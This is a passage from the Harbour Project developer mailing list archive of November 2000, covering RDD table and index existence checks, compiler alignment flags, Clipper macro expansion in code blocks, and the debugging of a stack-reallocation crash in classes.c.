</I>&gt;<i> on Thu, 9 Nov 2000 18:31:31 -0400
</I>&gt;<i>
</I>&gt;<i> &gt; As you say, to verify a DBF/NTX/CDX file existence... None of them exist
</I>on
&gt;<i> &gt; TOPConnect's world...
</I>&gt;<i>
</I>&gt;<i> The hb_fsFile() function can be used to check for *any* type of file,
</I>&gt;<i> including &quot;readme.txt&quot;, &quot;config.sys&quot;, or &quot;myfile.xyz&quot;. If it is a file,
</I>&gt;<i> then you can check if it exists using hb_fsFile().
</I>&gt;<i>
</I>&gt;<i> &gt; I deal with an Interface, not with files. What I'm saying is there
</I>&gt;<i> &gt; should be a Database System Independent way to verify file (table)
</I>&gt;<i> &gt; and index existence. Do I explain myself?
</I>&gt;<i>
</I>&gt;<i> I think I am starting to understand: You somtimes say &quot;file&quot; when you
</I>&gt;<i> mean &quot;table&quot;. When you say &quot;file&quot;, people are going to think that you
</I>&gt;<i> are referring to a file that resides in a file system controlled by an
</I>&gt;<i> operating system.
</I>&gt;<i>
</I>&gt;<i> So what you are really asking for are functions to check if a table
</I>&gt;<i> exists and to check if an index exists, where you only ask for the
</I>&gt;<i> table name or table and index names and the underlying RDD would
</I>&gt;<i> determine how to check for their existence. The NTX RDD might use FILE(
</I>&gt;<i> table+&quot;.dbf&quot; ) for a table check and might use FILE( table+ordbagext()
</I>&gt;<i> ) for an index check. And TopConnect would use different methods to
</I>&gt;<i> check for the existence of tables and indexes.
</I>&gt;<i>
</I>&gt;<i> But what would a CDX RDD do for an index check? For CDX, the index
</I>&gt;<i> consists of two parts: an order and a bag. So I guess there really
</I>&gt;<i> needs to be three checks: 1) Does the table exist; 2) Does the bag
</I>&gt;<i> exist; and 3) Does the order exist. Some RDDs will only need 1 and 2
</I>&gt;<i> (for example, NDX, NTX, and IDX). Some RDDs will only need 1 and 3 (for
</I>&gt;<i> example, SQL). And some RDDs will need all three (for example, CDX and
</I>&gt;<i> MDX).
</I>&gt;<i>
</I>&gt;<i> So perhaps the functions that are needed are:
</I>&gt;<i>
</I>&gt;<i>     ISTABLE( &lt;xcTableName&gt; )
</I>&gt;<i>     ISBAG( &lt;xcBagName&gt; )
</I>&gt;<i>     ISORD( &lt;xcTableName&gt;, &lt;xcIndexName&gt; [, &lt;xcBagName&gt;] )
</I>&gt;<i> --
</I>&gt;<i> David G. Holm, Set Captain and all around
</I>&gt;<i> Harbour Project Clipper Compatibility fanatic.
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 13:07:02 2000
Date: Fri Nov 10 13:07:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] alignment

<PRE>Luiz:
 
 
&gt;<i> my CFLAGS envar is set to -OS -w- -k- -r -vi -b- -Vx  -Ve -x -a8
</I>
does this work with FWH ?

Brian


</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 13:15:05 2000
Date: Fri Nov 10 13:15:05 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] RDD testing with indexes

<PRE>Harrier:


&gt;&gt;&gt;<i>... I try to run it, and it crashes both with CDX or NTX. dbClearInd(),
</I>dbSetIndex(), or elsewhere. Does this mean that they are not yet fully
functional? Whith what can I compare the results of my RDD?

I have a similar test for ads support, but ord* stuff stubbed out.  CDX and
NTX are barely working right now, as I understand it.

Perhaps you should compare to ADS ?  Just about all the 5.2-level functions
are working, and the 5.3 additions are coming as I add them to the super
layer.  There's a section in the Harbour help and a readme.txt in
contrib\rdd_ads with setup instructions.

Brian Hays
Abacus Data Systems, Inc




</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 14:33:04 2000
Date: Fri Nov 10 14:33:04 2000
From: Luiz Rafael Culik Guimaraes harbour@lists.harbour-project.org
Subject: [Harbour] alignment

<PRE>Brian

&gt;<i>
</I>&gt;<i> &gt; my CFLAGS envar is set to -OS -w- -k- -r -vi -b- -Vx  -Ve -x -a8
</I>&gt;<i>
</I>&gt;<i> does this work with FWH ?
</I>
I don´t know since i dont have FWH. Antonio can you check

Regards

Luiz Rafael Culik


</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 14:42:02 2000
Date: Fri Nov 10 14:42:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] alignment

<PRE>Luiz:
That's OK, I'm sure it won't as the byte alignment has to match the FWH
libraries -- I had just thought you were using FWH so it was a surprise.
Brian
&gt;<i> &gt; &gt; my CFLAGS envar is set to -OS -w- -k- -r -vi -b- -Vx  -Ve -x -a8
</I>&gt;<i> &gt; does this work with FWH ?
</I>&gt;<i> I don´t know since i dont have FWH. Antonio can you check
</I>


</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 14:50:03 2000
Date: Fri Nov 10 14:50:03 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] header files (Victor)

<PRE>Victor:
I created ord.ch and had hbapirdd.h #include it.  Unfortunately, ord.ch
_really_ needs to also include #commands for SET SCOPE TO, etc.
Should I let hbapirdd.h contain duplicates of the DBOI* constants, or should
I create a third ORDINFO.H file with these constants that is included by
both ord.ch and hbapirdd.h ??

Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 15:21:01 2000
Date: Fri Nov 10 15:21:01 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-10 11:40 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>2000-11-10 11:40 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * source/compiler/harbour.sly
     + Added support for early macro expansion, of declared symbol, for
simple macro expression within CodeBlock (Like Clipper).

   * source/rtl/tgetint.prg
     ! Corrected creation of bSetGet if uVar == NIL, to avoid compile error:
       &quot;Code block contains both macro and declared symbol references&quot;.

/*
   Here is a summary of Clipper handling of macros within code block:

   Terms: Declared Symbol =&gt; LOCAL or STATIC Variable
              Simple Macro      =&gt; &amp;Macro
              Complex Macro   =&gt; &amp;Macro.Text
              Early Macro        =&gt; &amp;Macro[.Text]
              Late Macro         =&gt; &amp;(...)

   When Clipper encounters an Early Macro within a code block, it converts
the block to a macro of the string representation of the block as follows:

   {|x| &amp;Macro := x } will be converted to &amp;( &quot;{|x| &amp;Macro := x }&quot; ) This in
effect forces an early evaluation of the macro because macros embedded
within strings are expanded on the fly. Since the block is being compiled
utilizing the &amp; Operator, any references to locals or statics within the
Block Expression can not be resolved by the Macro Operator, and thus Clipper
complains &quot;Code block contains both macro and declared symbol references&quot;.
Consider the following:

     LOCAL Macro := &quot;Var&quot;, bBlock

     bBlock := {|x| &amp;Macro := x }

   Because the above block contains an Early Macro, Clipper will convert the
block to:

     bBlock := &amp;( &quot;{|x| &amp;Macro := x }&quot; )

   But now the Macro contains reference to a declared symbol ( Macro ) and
thus the compile error.

   There is one exception, if the CodeBlock contains a Simple Macro, and
_only_ a Simple Macro, Clipper utilizes a hack to *allow* the Simple Macro
to reference a declared symbol. Here is an example:

     LOCAL Macro := &quot;Var&quot;, bBlock

     bBlock := {|| &amp;Macro }

   Clipper will convert the above block to :

      bBlock := &amp;( &quot;{|| &quot; + Macro + &quot;}&quot;

   This forces an early evaluation of Macro yet will _not_ complain even if
Macro *is* a reference of Declared Symbol.

   I hope the above explains Clipper behavior, limitations, and Error
Messages, with regard to CodeBlocks containing Early Macros.

   Early/Late expansions of macros, within CodeBlock, should now be 100%
Clipper compatible (with SimpLex).

   !!! Note to Documenters: Should the above be included in Documentation of
Blocks? !!!
*/

Ron


</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 16:08:01 2000
Date: Fri Nov 10 16:08:01 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Strange findings

<PRE>John and Ryszard:
Thanks for the ideas on the slower later module.

FWIW, I checked that Incremental Linking was turned off (no state files with
ilink32), so that wasn't it.
I also removed the debug switches and lib, with no change.

It just makes no sense that an identical routine from a library later in the
link script would be 10 to 15% slower, but I have to back to rdd stuff....

Brian Hays



</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 16:54:00 2000
Date: Fri Nov 10 16:54:00 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] classes.c

<PRE>Hi Jean,

sorry to bother, but I keep receiving exceptions if I don't uses an
increased initial stack size. 

And, btw, this piece of code does not work with a &quot;jumping stack&quot; since
cString is a pointer to a memory location which will be invalid as soon
as a stack growth will happen.

regards.

 if( hb_pcount() &gt;= 1 )
   {

      char * cString=hb_parc(1);
      PHB_DYNS pDynSym = hb_dynsymFind( cString );

      if( pDynSym )                             /* Find
function            */
      {
         USHORT uiClass;

         hb_vmPushSymbol( pDynSym-&gt;pSymbol );        /* Push function
name       */
         hb_vmPushNil();
         hb_vmFunction( 0 );                         /* Execute super
class      */

         if( HB_IS_OBJECT( &amp;hb_stack.Return ) )
         {
            for( uiClass = 0; ! bFound &amp;&amp; uiClass &lt; s_uiClasses;
uiClass++ )
            {                                      /* Locate the
entry         */
               if( hb_stricmp( cString , s_pClasses[ uiClass ].szName )
== 0 )


-------------------------------^^^^^^^^^^^

Here cString will surely be invalid.





-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 16:56:01 2000
Date: Fri Nov 10 16:56:01 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] CHANGELOG: 2000-11-10 22:50 GMT+1

<PRE>2000-11-10 22:50 GMT+1 Maurilio Longo &lt;<A HREF="mailto:maurilio.longo@libero.it">maurilio.longo@libero.it</A>&gt;
   * source/rtl/teditor.prg
      ! error in cursor handling when K_CTRL_PGDN or K_CTRL_END key was
pressed.
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 17:06:01 2000
Date: Fri Nov 10 17:06:01 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] classes.c

<PRE>Hi Maurilio

&gt;<i> sorry to bother, but I keep receiving exceptions if I don't uses an
</I>&gt;<i> increased initial stack size. 
</I>&gt;<i> 
</I>&gt;<i> And, btw, this piece of code does not work with a &quot;jumping stack&quot; since
</I>&gt;<i> cString is a pointer to a memory location which will be invalid as soon as
</I>&gt;<i> a stack growth will happen.
</I>
It must work... and even worths, it work here even if I reduce the 
initial stack up to 20 with an increase of 5 (to be sure it will 
increase as often as possible).

see end of this message ...
 
&gt;<i> regards.
</I>&gt;<i> 
</I>&gt;<i>  if( hb_pcount() &gt;= 1 )
</I>&gt;<i>    {
</I>&gt;<i> 
</I>&gt;<i>       char * cString=hb_parc(1);
</I>&gt;<i>       PHB_DYNS pDynSym = hb_dynsymFind( cString );
</I>&gt;<i> 
</I>&gt;<i>       if( pDynSym )                             /* Find
</I>&gt;<i> function            */
</I>&gt;<i>       {
</I>&gt;<i>          USHORT uiClass;
</I>&gt;<i> 
</I>&gt;<i>          hb_vmPushSymbol( pDynSym-&gt;pSymbol );        /* Push function name
</I>&gt;<i>       */
</I>&gt;<i>          hb_vmPushNil();
</I>&gt;<i>          hb_vmFunction( 0 );                         /* Execute super
</I>&gt;<i> class      */
</I>&gt;<i> 
</I>&gt;<i>          if( HB_IS_OBJECT( &amp;hb_stack.Return ) )
</I>&gt;<i>          {
</I>&gt;<i>             for( uiClass = 0; ! bFound &amp;&amp; uiClass &lt; s_uiClasses;
</I>&gt;<i> uiClass++ )
</I>&gt;<i>             {                                     /* Locate the
</I>&gt;<i> entry         */
</I>&gt;<i>                if( hb_stricmp( cString , s_pClasses[ uiClass ].szName ) ==
</I>&gt;<i> 0 )
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> -------------------------------^^^^^^^^^^^
</I>&gt;<i> 
</I>&gt;<i> Here cString will surely be invalid.
</I>
Nooooo, !!! It must be valid, as this is not a value from the stack, 
but instead a copy created by hb_parc(1). The problem could only 
arise when using hb_param() wich in fact return one stack item 
pointer (and so if the stack.base moved...).
 
I also changed three other functions where I used hb_param() when 
I could use hb_parc() but there was here the only case where I was 
using the pointer after the stack realloc. The problem could not 
stay here anymore or there is a serious problem with hb_parc().

very strange problem ...


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 17:26:01 2000
Date: Fri Nov 10 17:26:01 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] classes.c ... hb_parc()

<PRE>I should have read the function hb_parc() before to respond to your 
mail :-(((

It seem it simply return a pointer to the stack, not a copy !!!!!! So 
you are rigth, it must change after a realloc.

I just do a try where I reread hb_parc(1) just before use it the 
second time (and after the vmPush() ). Please have a try and let 
me know what's the matter.

TIA, 

Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 17:36:01 2000
Date: Fri Nov 10 17:36:01 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-10 22:40 UTC+0100 JFL (mafact) <jfl@mafact.com>

<PRE>2000-11-10 22:40 UTC+0100 JFL (mafact) &lt;<A HREF="mailto:jfl@mafact.com">jfl@mafact.com</A>&gt;
   * source/vm/classes.c
     Just a test with hb_parc() wich I recall just after vmPush()
     to be sure to have a good pointer. if it work, we should have
     some brain storming about hb_parxx function and the stack !

Please, maurillio, have a new test :-(, Thanks,


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 17:40:04 2000
Date: Fri Nov 10 17:40:04 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>Hannes, 

&gt;<i> Well, I think the Clipper doc says, that the File() function not only looks
</I>&gt;<i> in the current directory but also in the directory specified by the SET PATH
</I>&gt;<i> TO command - if the argument does not contain a path, of course. Now, when I
</I>&gt;<i> tried compiling one of my apps with Harbour, it seemed that this is not true
</I>&gt;<i> for Harbour. Harbour looks for the file in the current directory only. Is
</I>&gt;<i> this true?
</I>
Yes it's true, its'a bug, moreover CA-Clipper 
supports wldcard in the filename while Harbour not.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 17:43:01 2000
Date: Fri Nov 10 17:43:01 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] Strange findings

<PRE>Brian,


&gt;<i> It just makes no sense that an identical routine from a library later in the
</I>&gt;<i> link script would be 10 to 15% slower, but I have to back to rdd stuff....
</I>
It may help if you'd decompile the code (.OBJ or .EXE) and check the 
assembly listing to see what's _exactly_ executing.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 17:47:02 2000
Date: Fri Nov 10 17:47:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] classes.c

<PRE>JF, Maurilio, all

Would it be a reasonable test if we'd change the Stack handling 
functions in a way that they'd _always_ change address (intentionally), 
this way such problems would be far more easy to be reproduced even 
with very simple programs. This would be some kind of stress test 
mode of Harbour which could be turned on with a #define named 
let's say HB_STACK_STRESS_TEST.

Could this help ?

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 17:51:02 2000
Date: Fri Nov 10 17:51:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] classes.c ... hb_parc()

<PRE>JF,


&gt;<i> I should have read the function hb_parc() before to respond to your 
</I>&gt;<i> mail :-(((
</I>&gt;<i> 
</I>&gt;<i> It seem it simply return a pointer to the stack, not a copy !!!!!! So 
</I>&gt;<i> you are rigth, it must change after a realloc.
</I>
hb_parc() is returning a pointer to the string area itself, not to the 
item, currently it's safe to use the pointer as long as the item 
exists at all, and as long as we don't want to write to this memory 
(except when ISBYREF() is TRUE).

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 17:55:03 2000
Date: Fri Nov 10 17:55:03 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] header files (Victor)

<PRE>Brian,

&gt;<i> I created ord.ch and had hbapirdd.h #include it.  Unfortunately, ord.ch
</I>&gt;<i> _really_ needs to also include #commands for SET SCOPE TO, etc.
</I>&gt;<i> Should I let hbapirdd.h contain duplicates of the DBOI* constants, or should
</I>&gt;<i> I create a third ORDINFO.H file with these constants that is included by
</I>&gt;<i> both ord.ch and hbapirdd.h ??
</I>
I think that the best way is to duplicate those defines in this case, along with a 
comment that those defines should be always synced with the ones in the 
other file.

I think it's not worth to introdoce a new (kind of low level) header file just for 
this, considering that including .CH files from C code is not a good practice 
anyway.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 17:59:02 2000
Date: Fri Nov 10 17:59:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] classes.c

<PRE>Hi Victor

&gt;<i> Would it be a reasonable test if we'd change the Stack handling 
</I>&gt;<i> functions in a way that they'd _always_ change address (intentionally),
</I>&gt;<i> this way such problems would be far more easy to be reproduced even with
</I>&gt;<i> very simple programs. This would be some kind of stress test mode of
</I>&gt;<i> Harbour which could be turned on with a #define named let's say
</I>&gt;<i> HB_STACK_STRESS_TEST.
</I>
I use here some kind of flag within hvm.c to test it (with 20 and 5 in 
place of 100 and 20) but I don't thing it's necessary to implement it 
definitively.



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 18:01:03 2000
Date: Fri Nov 10 18:01:03 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] classes.c ... hb_parc()

<PRE>Victor,

&gt;<i> &gt; I should have read the function hb_parc() before to respond to your mail
</I>&gt;<i> &gt; :-(((
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; It seem it simply return a pointer to the stack, not a copy !!!!!! So
</I>&gt;<i> &gt; you are rigth, it must change after a realloc.
</I>&gt;<i> 
</I>&gt;<i> hb_parc() is returning a pointer to the string area itself, not to the
</I>&gt;<i> item, currently it's safe to use the pointer as long as the item exists at
</I>&gt;<i> all, and as long as we don't want to write to this memory (except when
</I>&gt;<i> ISBYREF() is TRUE).
</I>
Ok, but in all case, the pointer is changing after a stack realloc ... 
So the last question now is ... why ?

I'm waiting Maurillio test before to continue to investigate (For an 
undefined reason, I can't reproduce the error here :-((() just to see if 
the fact to call hb_parc(1) one more time after the stack realloc will 
give me a good pointer.

Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 18:16:02 2000
Date: Fri Nov 10 18:16:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] classes.c ... hb_parc()

<PRE>JF,

&gt;<i> &gt; &gt; It seem it simply return a pointer to the stack, not a copy !!!!!! So
</I>&gt;<i> &gt; &gt; you are rigth, it must change after a realloc.
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; hb_parc() is returning a pointer to the string area itself, not to the
</I>&gt;<i> &gt; item, currently it's safe to use the pointer as long as the item exists at
</I>&gt;<i> &gt; all, and as long as we don't want to write to this memory (except when
</I>&gt;<i> &gt; ISBYREF() is TRUE).
</I>&gt;<i> 
</I>&gt;<i> Ok, but in all case, the pointer is changing after a stack realloc ... 
</I>&gt;<i> So the last question now is ... why ?
</I>
Hmm, since the string pointer _can't_ change in the item I think 
the problem could be that hb_parc( 1 ) is no longer returning the 
first parameter passed to the function, after some hb_vm*() calls.

So I think the problem is that the hb_vmDo/Function() calls are 
changing the stack in a way that they fool the subsequent hb_par*() 
calls.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 18:27:03 2000
Date: Fri Nov 10 18:27:03 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Strange findings

<PRE>It gets stranger.

The good news is, memoread can pull in a 1.4MB long-named zip file no
problem, and chrcount can whip through it 100 times in about a second.

I completely renamed the GT module to make sure similar names weren't an
issue.
Either routine linked and executed alone runs at the SLOW speed!!
IOW, if I link in gt.lib AFTER my routine, mine runs 15% faster!

What isn't really clear is whether the routine itself is slower (hard to
believe but seems to be the case) or accessing it is slower.
Changing the number of loops from 60000 to 10000 yields the same speed
ratio.

Other notes: The lib list in a response file is reversed from the command
line, so when I say the &quot;first linked one&quot; that is the first on the command
line or the later one in a response file.

Brian Hays



</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 23:54:02 2000
Date: Fri Nov 10 23:54:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] DBOI_RECNO - what is it, really?

<PRE>Can someone confirm for me what this flag for dbOrderInfo really is?
The docs start to imply it is the physical record number, but then say
&quot;within the order&quot;.
DBOI_POSITION is the KeyNo respecting filters.  Is DBOI_RECNO the KeyNo
ignoring filters?

If so, is it the same as DBOI_KEYNORAW  ??????

Thanks

Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 23:55:07 2000
Date: Fri Nov 10 23:55:07 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Strange findings

<PRE>&gt;<i> &gt; It just makes no sense that an identical routine from a library later in
</I>the
&gt;<i> &gt; link script would be 10 to 15% slower, but I have to back to rdd
</I>stuff....
&gt;<i>
</I>&gt;<i> It may help if you'd decompile the code (.OBJ or .EXE) and check the
</I>&gt;<i> assembly listing to see what's _exactly_ executing.
</I>&gt;<i>
</I>&gt;<i> Victor Szakats
</I>
I'll give it a shot....


</PRE>

From harbour@lists.harbour-project.org  Sat Nov 11 01:27:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Sat Nov 11 01:27:02 2000
Subject: [Harbour] classes.c ... hb_parc()
References: <200011102300.AAA07391@pyxis.wanadoo.be>
Message-ID: <3A0CE69C.CDFFFD99@libero.it>

Jean,

as usual :-|

Exception c0000005 at address 1915d
Called from TCLASS:CREATE(166)
Called from TSCEGLIQUERY(19)
Called from TSQLEDITOR:SELEZIONAQUERY(144)
Called from TSQLEDITOR:KEYBOARDHOOK(113)
Called from TSQLEDITOR:EDIT(896)
Called from MAIN(64)

Process terminated by SIGSEGV
core dumped
SYS1808:
Il processo è terminato. Il codice per la diagnostica
software (codice dell'errore) è  0005.

regards.


JF Lefebvre ha scritto:
> 
> Victor,
> 
> > > I should have read the function hb_parc() before to respond to your mail
> > > :-(((
> > >
> > > It seem it simply return a pointer to the stack, not a copy !!!!!! So
> > > you are rigth, it must change after a realloc.
> >
> > hb_parc() is returning a pointer to the string area itself, not to the
> > item, currently it's safe to use the pointer as long as the item exists at
> > all, and as long as we don't want to write to this memory (except when
> > ISBYREF() is TRUE).
> 
> Ok, but in all case, the pointer is changing after a stack realloc ...
> So the last question now is ... why ?
> 
> I'm waiting Maurillio test before to continue to investigate (For an
> undefined reason, I can't reproduce the error here :-((() just to see if
> the fact to call hb_parc(1) one more time after the stack realloc will
> give me a good pointer.
> 
> Best regards,
> 
> J. Lefebvre,
> Bruxelles,
> Belgium
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From jfl@wanadoo.be  Sat Nov 11 03:33:02 2000
From: jfl@wanadoo.be (JF Lefebvre)
Date: Sat Nov 11 03:33:02 2000
Subject: [Harbour] classes.c ... hb_parc()
In-Reply-To: <3A0CE69C.CDFFFD99@libero.it>
Message-ID: <200011110832.JAA02468@pegasus.wanadoo.be>

Maurilio

As you know I can't reproduce the error here but, just to have more 
information, could you trace the pointer value (not the content, the 
pointer itself) on the first hb_parc(1) call and from the second. It 
could be interesting to know if the pointer changed or no.

TIA

> Jean,
> 
> as usual :-|
> 
> Exception c0000005 at address 1915d
> Called from TCLASS:CREATE(166)
> Called from TSCEGLIQUERY(19)
> Called from TSQLEDITOR:SELEZIONAQUERY(144)
> Called from TSQLEDITOR:KEYBOARDHOOK(113)
> Called from TSQLEDITOR:EDIT(896)
> Called from MAIN(64)
> 
> Process terminated by SIGSEGV
> core dumped
> SYS1808:
> Il processo =E8 terminato. Il codice per la diagnostica
> software (codice dell'errore) =E8  0005.
> 
> regards.
> 
> 
> JF Lefebvre ha scritto:
> > 
> > Victor,
> > 
> > > > I should have read the function hb_parc() before to respond to you=
r
> > > > mail :-(((
> > > >
> > > > It seem it simply return a pointer to the stack, not a copy !!!!!!
> > > > So you are rigth, it must change after a realloc.
> > >
> > > hb_parc() is returning a pointer to the string area itself, not to t=
he
> > > item, currently it's safe to use the pointer as long as the item
> > > exists at all, and as long as we don't want to write to this memory
> > > (except when ISBYREF() is TRUE).
> > 
> > Ok, but in all case, the pointer is changing after a stack realloc ...
> > So the last question now is ... why ?
> > 
> > I'm waiting Maurillio test before to continue to investigate (For an
> > undefined reason, I can't reproduce the error here :-((() just to see =
if
> > the fact to call hb_parc(1) one more time after the stack realloc will
> > give me a good pointer.
> > 
> > Best regards,
> > 
> > J. Lefebvre,
> > Bruxelles,
> > Belgium
> > 
> > _______________________________________________
> > Harbour mailing list
> > Harbour@lists.harbour-project.org
> > http://www.matrixlist.com/mailman/listinfo/harbour
> > 
> > Thank you for participating in The Harbour Project.  Be sure to check
> > http://www.Harbour-Project.org
> 
> -- 
> 
>  __________                   
> |  |  | |__| md2520@mclink.it 
> |_|_|_|____| Team OS/2 Italia
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Sat Nov 11 04:33:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Sat Nov 11 04:33:02 2000
Subject: [Harbour] alignment
In-Reply-To: <003501c04b4d$01fd0ce0$0100007f@sl.conex.net>
Message-ID: <000101c04bc2$1a9b5520$0f2aa8c0@fivetechs>

Luiz,

> > does this work with FWH ?
> I don´t know since i dont have FWH. Antonio can you check

I don't think so as FWH uses 4 bytes alignment.

Alignment is very important in several FWH places
(i.e.: resources management).


Antonio


From harbour@lists.harbour-project.org  Sat Nov 11 04:53:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Sat Nov 11 04:53:02 2000
Subject: [Harbour] classes.c (Ryszard, JF, Maurilio)
In-Reply-To: <200011102205.XAA04612@pegasus.wanadoo.be>
Message-ID: <000201c04bc4$faf4e300$0f2aa8c0@fivetechs>

Ryszard,

Could it be that a stack reallocation generates
a garbage collection (cause the memory management) ?

I guess that 'cString' points to a memory chunck
controlled by the garbage collection engine.

How could we check this ?


Antonio


From harbour@lists.harbour-project.org  Sat Nov 11 05:06:01 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Sat Nov 11 05:06:01 2000
Subject: [Harbour] classes.c (some thoughts)
In-Reply-To: <3A0C665E.6FCB428F@libero.it>
Message-ID: <000301c04bc6$cf8854c0$0f2aa8c0@fivetechs>

>       char * cString=hb_parc(1);      We have a valid string pointer

...

>       hb_vmPushSymbol( pDynSym->pSymbol );  These may reallocate the stack
>       hb_vmPushNil();

...

>       if( hb_stricmp( cString , s_pClasses[ uiClass ].szName ) > == 0 )

GPFs here so cString is not a valid pointer anymore...
or could it be that .szName is the one that is not valid anymore ?


Antonio


From harbour@lists.harbour-project.org  Sat Nov 11 05:14:01 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Sat Nov 11 05:14:01 2000
Subject: [Harbour] classes.c
In-Reply-To: <3A0C665E.6FCB428F@libero.it>
Message-ID: <000401c04bc7$dc3f87a0$0f2aa8c0@fivetechs>

Maurilio,

> And, btw, this piece of code does not work with a "jumping stack"...

FYI, Clipper internally uses this "jumping" technique in many places.

i.e. The Clipper dynamic symbol table grows the same way... :-)
(just when it is needed).

Antonio

From jfl@wanadoo.be  Sat Nov 11 05:24:02 2000
From: jfl@wanadoo.be (JF Lefebvre)
Date: Sat Nov 11 05:24:02 2000
Subject: [Harbour] classes.c (Ryszard, JF, Maurilio)
In-Reply-To: <000201c04bc4$faf4e300$0f2aa8c0@fivetechs>
References: <200011102205.XAA04612@pegasus.wanadoo.be>
Message-ID: <200011111023.LAA10408@pegasus.wanadoo.be>

Hi Antonio

> Could it be that a stack reallocation generates
> a garbage collection (cause the memory management) ?
> 
> I guess that 'cString' points to a memory chunck
> controlled by the garbage collection engine.

As I said to maurillio, I can't reproduce the problem (with Maurillio's 
program with (now) very small modifications) here even with some 
hvm constant causing very frequent stack reallocation (20 & 5).

Here (BCC55 svp2 & Win98 or Win2000) , when a stack 
reallocation occur, the cstring pointer keeped it's value.

The problem is strange and I would like to wait Maurillio respons 
against my last mail because it's clear there where a problem with 
my initial __clsinstsuper()  function where I keeped an ITEM pointer 
from the stack and tryed to use it after stack reallocation. In this 
case, I'm able to reproduce the problem !!! But for me it should be 
